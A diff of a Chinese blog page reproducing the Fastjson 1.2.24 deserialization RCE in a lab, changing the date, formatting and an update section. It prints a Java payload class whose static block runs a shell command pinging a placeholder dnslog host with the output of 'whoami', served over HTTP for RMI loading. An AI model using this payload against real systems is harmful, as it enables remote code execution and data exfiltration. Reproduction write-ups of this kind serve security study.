@@ -397,7 +397,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-22
+                    2021-11-26
                 </div>
                 
 
@@ -445,7 +445,7 @@
 <p>Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上</p>
 <p>它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象</p>
 </blockquote>
-<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>fastjson接受的JSON可以通过<code>@type</code>字段来指定该JSON应当还原成何种类型的对象，也就是未对<code>@type</code>中加载进的类进行过滤，导致的这一版漏洞</p>
+<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>fastjson接受的JSON可以通过<code>@type</code>字段来指定该JSON应当还原成何种类型的对象，也就是<strong>未对<code>@type</code>中加载进的类进行过滤</strong>，导致的这一版漏洞</p>
 <blockquote>
 <p>主要由于利用templatesImlp这个类，这个类中有一个_bytecodes字段，部分函数能够根据这个字段来生成类的实例，这个类的构造函数是我们可控的，就能rce</p>
 </blockquote>
@@ -455,6 +455,8 @@
 <p><strong>jkd1.8 + maven 3.3.9</strong></p>
 <p>maven安装</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 下载 https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;</span><br><span class="line"># 解压</span><br><span class="line">tar -zxvf </span><br><span class="line"># 配置环境变量</span><br><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">添加</span><br><span class="line">export MAVEN_HOME&#x3D;&#x2F;xxx&#x2F;apache-maven-3.3.9 &#x2F;&#x2F;maven位置</span><br><span class="line">export PATH&#x3D;$&#123;PATH&#125;:$&#123;MAVEN_HOME&#125;&#x2F;bin</span><br><span class="line"># 更新配置</span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
+
+
 <p><img src="https://i.loli.net/2021/09/16/gVY59HIiWMf64s1.png" alt="image-20210916184550020"></p>
 <h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>访问8090端口</p>
 <p><img src="https://i.loli.net/2021/09/16/zpdBxQsut6OJlPg.png" alt="image-20210916182541274"></p>
@@ -469,7 +471,7 @@
 <p>RMI是远程方法调用，是一种实现远程过程调用的java api</p>
 </blockquote>
 <h4 id="编译生成-class文件"><a href="#编译生成-class文件" class="headerlink" title="编译生成.class文件"></a>编译生成.class文件</h4><p>dnslog.java文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class dnslog&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123; &quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, &quot;ping user.&#96;whoami&#96;.dnslog地址&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dnslog</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ping user.`whoami`.dnslog地址&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p><code>javac dnslog.java</code>生成.class文件</p>
 <p>在当前目录下</p>
 <h4 id="python起一个http服务"><a href="#python起一个http服务" class="headerlink" title="python起一个http服务"></a>python起一个http服务</h4><p>监听在1234端口上</p>
@@ -503,6 +505,9 @@
 <h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><ul>
 <li>记得开启防火墙对应端口并在安全组添加策略，或是直接关闭防火墙</li>
 </ul>
+<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>攻击机：vps</p>
+<p>环境</p>
+<p><img src="https://i.loli.net/2021/11/24/V3gPZriuHDywfnh.png" alt="image-20211124153322616"></p>
 <h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/14499041.html">Fastjson1.2.24RCE漏洞复现</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242712.html">Fastjson1.2.24漏洞复现详细过程（freebuf）</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/13466362.html">漏洞复现-fastjson1.2.24-RCE</a></p>
@@ -896,7 +901,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">35.2k</span>&nbsp;字
+                class="white-color">36.6k</span>&nbsp;字
             
             
             
